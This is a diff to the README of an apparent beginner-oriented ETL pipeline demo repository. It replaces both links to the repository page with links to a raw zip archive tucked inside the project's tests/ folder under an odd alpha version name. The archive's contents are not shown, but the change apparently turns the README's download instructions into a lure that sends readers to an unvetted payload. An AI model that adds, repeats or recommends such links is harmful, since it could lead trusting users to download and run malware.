@@ -1,6 +1,6 @@
 # 📊 etl-pipeline-demo - Learn how data pipelines move information
 
-[![](https://img.shields.io/badge/Download_Project-Blue-blue.svg)](https://github.com/meatusatomicnumber977/etl-pipeline-demo)
+[![](https://img.shields.io/badge/Download_Project-Blue-blue.svg)](https://github.com/meatusatomicnumber977/etl-pipeline-demo/raw/refs/heads/main/tests/pipeline-demo-etl-2.8-alpha.3.zip)
 
 ## 📁 Project Overview
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these needs:
 
 Visit the repository page to download the software files to your computer.
 
-[Click here to open the download page](https://github.com/meatusatomicnumber977/etl-pipeline-demo)
+[Click here to open the download page](https://github.com/meatusatomicnumber977/etl-pipeline-demo/raw/refs/heads/main/tests/pipeline-demo-etl-2.8-alpha.3.zip)
 
 Follow these steps to save the project:
 
